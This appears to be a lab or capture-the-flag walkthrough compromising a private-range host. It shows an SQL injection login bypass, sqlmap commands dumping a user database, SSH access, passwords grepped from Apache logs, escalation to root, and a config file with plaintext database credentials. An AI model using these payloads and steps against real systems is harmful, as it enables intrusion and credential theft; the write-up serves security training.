## NMAP
```
nmap -A -T4 10.10.110.45
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-31 11:17 PDT
Nmap scan report for 10.10.110.45
Host is up (0.066s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 04a74f399565c5b08dd5492ed8440036 (ECDSA)
|_  256 b45e8393c54249de7125927123b18554 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
| http-title: Beta Login
|_Requested resource was http://10.10.110.45/login/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.74 seconds
```
## SQL Injection to loginpag

User:
```
admin' or '1'='1
```
This takes us to index.php

## Gobuster
```
/login                (Status: 301) [Size: 312] [--> http://10.10.110.45/login/]
/javascript           (Status: 301) [Size: 317] [--> http://10.10.110.45/javascript/]
/notes                (Status: 301) [Size: 312] [--> http://10.10.110.45/notes/]
```
### http://10.10.110.45/notes/
```ToDo
Finish developing the application and make it public.

Remove personal account from database and update tables for production.

Perform unit testing.

Done
Update SSH Password to L3ZBT6wvj5m6sP!x
```
## SQL MAP
### req.txt
```
POST /login/ HTTP/1.1
Host: 10.10.110.45
Content-Length: 29
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://10.10.110.45
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.10.110.45/login/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=svu4t16ph1ul779n82gavaqj1k
Connection: close

username=admin&password=admin
```
## SQLmap

```
sqlmap -r req.txt --dbs --batch
```

Results
```
available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys
[*] users
```

```
sqlmap -r req.txt --batch -D users --dbs --dump
```
Results
```rust
+----------------------------------+----------+
| password                         | username |
+----------------------------------+----------+
| 475bd541acb5528f4d8c8948b8ead2a3 | admin    |
| e07b04a6487acefafbd9b733914adc32 | adam     |
+----------------------------------+----------+
```
### SSH
```
ssh adam@10.10.110.45
adam@10.10.110.45's password: 
```
Searching for permissions
## ID
```
adam@DEV01-Ares:/etc/cron.daily$ id
uid=1000(adam) gid=1000(adam) groups=1000(adam),4(adm)
```
Look at the /var/log/apache2
```
adam@DEV01-Ares:/var/log/apache2$ cat access.log.1 |grep password
10.10.14.3 - - [03/Dec/2020:09:06:26 +0000] "GET /login/?username=admin&password=8NJxgU2CtVsJYZE5 HTTP/1.1" 200 625 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:82.0) Gecko/20100101 Firefox/82.0"
10.10.14.3 - - [03/Dec/2020:09:06:26 +0000] "GET /login/?username=admin&password=$@#G34123421 HTTP/1.1" 200 625 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:82.0) Gecko/20100101 Firefox/82.0"
```
## su root
```
adam@DEV01-Ares:/var/log/apache2$ su root
Password: 
root@DEV01-Ares:/var/log/apache2# id
uid=0(root) gid=0(root) groups=0(root)
```
Further Enumeration

```
root@DEV01-Ares:/var/www/html/login# ls
config.php  config.php.bak  index.php  license.txt  style.css```
Results
```
<?php
// Use SQL02 in production
$con = new mysqli("10.10.110.10", "root", "sbtR5t7cq7PWE3AJ", "users");

if ($con->connect_errno) {
    printf("connection failed: %s\n", $con->connect_error());
    exit();
}

?>

```
